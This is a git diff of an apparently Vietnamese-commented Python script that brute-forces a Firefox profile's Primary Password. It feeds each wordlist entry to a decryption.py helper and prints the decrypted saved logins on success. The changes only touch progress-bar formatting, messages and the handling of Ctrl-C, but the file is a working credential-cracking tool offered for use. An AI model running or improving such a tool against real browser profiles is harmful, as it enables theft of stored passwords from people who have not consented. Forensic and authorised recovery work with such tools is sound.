@@ -18,20 +18,18 @@ def try_password(profile_path, password):
         )
         return result.stdout.strip() + result.stderr.strip()  # Gộp stdout và stderr
     except Exception as e:
-        return f"[!] Error: {e}"
+        return f"Error: {e}"
 
 # Quét từng password trong wordlist để brute-force
-def bruteforce(profile_path, passwords):
-    print(f"[*] Total password to try: {len(passwords)}\n")
-    
-    for password in tqdm(passwords, desc="Bruteforcing", ncols=80, leave=False, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed} - {remaining}]"):
-        # print(f"[*] Trying: {password}", end="\r")
+def bruteforce(profile_path, passwords):    
+    for password in tqdm(passwords, desc="Bruteforcing", ncols=77, leave=False, bar_format="{l_bar} {bar} | {n_fmt}/{total_fmt} [{elapsed} - {remaining}] | "):
+        print(f"Trying: {password}", end="\r", flush=True)
         output = try_password(profile_path, password)
-        if output and not output.startswith("[!] Error"):
-            print(f"\n\n[+] Success! Primary Password is: {password}\n")
+        if output and not output.startswith("Error"):
+            print(f"\nSuccess! Primary Password is: {password}")
             print(output)
             return
-    print("\n[-] Fail! No valid password found.")
+    print("\nFail! No valid password found")
 
 def main():
     parser = argparse.ArgumentParser(description="Brute-force Firefox Primary Password using decryption.py")
@@ -43,7 +41,7 @@ def main():
         passwords = load_wordlist(args.fuzzing)  # Load danh sách mật khẩu từ file
         bruteforce(args.profile, passwords)      # Bắt đầu brute-force
     except KeyboardInterrupt:
-        exit(0)
+        print("\nBrute-force interrupted")
 
 if __name__ == "__main__":
     main()
